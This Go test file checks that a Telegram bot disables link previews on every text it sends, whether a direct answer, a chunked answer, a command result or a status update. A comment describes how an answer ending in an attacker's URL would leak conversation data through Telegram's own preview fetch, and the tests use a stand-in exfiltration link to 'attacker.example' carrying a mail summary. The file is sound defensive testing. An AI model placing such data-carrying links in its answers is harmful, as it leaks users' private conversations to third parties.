package telegram

import (
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

// telegramSendRecorder is a Bot API fixture that records the form of every
// sendMessage call.
type telegramSendRecorder struct {
	mu   sync.Mutex
	sent []url.Values
	bot  *tgbotapi.BotAPI
}

func newTelegramSendRecorder(t *testing.T) *telegramSendRecorder {
	t.Helper()
	recorder := &telegramSendRecorder{}
	remote := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasSuffix(r.URL.Path, "/getMe") {
			_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "result": map[string]any{"id": 11, "is_bot": true, "username": "fixture"}})
			return
		}
		if err := r.ParseForm(); err != nil {
			t.Errorf("parse the Bot API request: %v", err)
		}
		if strings.HasSuffix(r.URL.Path, "/sendMessage") {
			recorder.mu.Lock()
			recorder.sent = append(recorder.sent, r.PostForm)
			recorder.mu.Unlock()
		}
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "result": map[string]any{"message_id": 1}})
	}))
	t.Cleanup(remote.Close)
	bot, err := tgbotapi.NewBotAPIWithClient("token", remote.URL+"/bot%s/%s", remote.Client())
	if err != nil {
		t.Fatalf("construct Telegram bot API: %v", err)
	}
	recorder.bot = bot
	return recorder
}

func (r *telegramSendRecorder) messages() []url.Values {
	r.mu.Lock()
	defer r.mu.Unlock()
	return append([]url.Values(nil), r.sent...)
}

// Telegram fetches the URL of a link preview itself, so an answer that ends in
// an attacker's URL with conversation data in its query would leak without any
// tool call. Every text the bot sends has to switch previews off, whichever path
// it takes and however many chunks it needs.
func TestTelegramTextSendsDisableLinkPreviews(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	const link = "https://attacker.example/r?d=summary-of-the-mails"
	longAnswer := strings.Repeat("a", 4096) + " " + link

	sends := []struct {
		name string
		send func(bot *tgbotapi.BotAPI) error
		want int
	}{
		{"answer", func(bot *tgbotapi.BotAPI) error {
			return deliverMessage(bot, 4711, "Reference: "+link, "answer", logger)
		}, 1},
		{"chunked answer", func(bot *tgbotapi.BotAPI) error { return deliverMessage(bot, 4711, longAnswer, "answer", logger) }, 2},
		{"command result", func(bot *tgbotapi.BotAPI) error { return deliverMessage(bot, 4711, link, "command result", logger) }, 1},
		{"broker status", func(bot *tgbotapi.BotAPI) error {
			(&TelegramBroker{bot: bot, chatID: 4711, logger: logger}).Send("progress", "fetching "+link)
			return nil
		}, 1},
	}
	for _, send := range sends {
		t.Run(send.name, func(t *testing.T) {
			recorder := newTelegramSendRecorder(t)
			if err := send.send(recorder.bot); err != nil {
				t.Fatalf("send: %v", err)
			}
			messages := recorder.messages()
			if len(messages) != send.want {
				t.Fatalf("sendMessage calls = %d, want %d", len(messages), send.want)
			}
			for i, form := range messages {
				if got := form.Get("disable_web_page_preview"); got != "true" {
					t.Errorf("sendMessage %d: disable_web_page_preview = %q, want true", i, got)
				}
			}
		})
	}
}

// A new text sender built on tgbotapi.NewMessage would send with previews on.
// Only sendTelegramMessage (which switches them off) and the fixed connectivity
// test text may build one.
func TestTelegramTextMessagesAreBuiltOnlyWhereLinkPreviewsAreOff(t *testing.T) {
	allowed := map[string]bool{"sendTelegramMessage": true, "SendTestMessage": true}
	files, err := filepath.Glob("*.go")
	if err != nil || len(files) == 0 {
		t.Fatalf("list the telegram package files: %v", err)
	}
	for _, file := range files {
		if strings.HasSuffix(file, "_test.go") {
			continue
		}
		source, err := os.ReadFile(file)
		if err != nil {
			t.Fatalf("read %s: %v", file, err)
		}
		current := ""
		for _, line := range strings.Split(string(source), "\n") {
			if match := telegramFuncHeader.FindStringSubmatch(strings.TrimSpace(line)); match != nil {
				current = match[1]
			}
			if strings.Contains(line, "tgbotapi.NewMessage(") && !allowed[current] {
				t.Errorf("%s: %s builds a text message that would send with link previews on", file, current)
			}
		}
	}
}
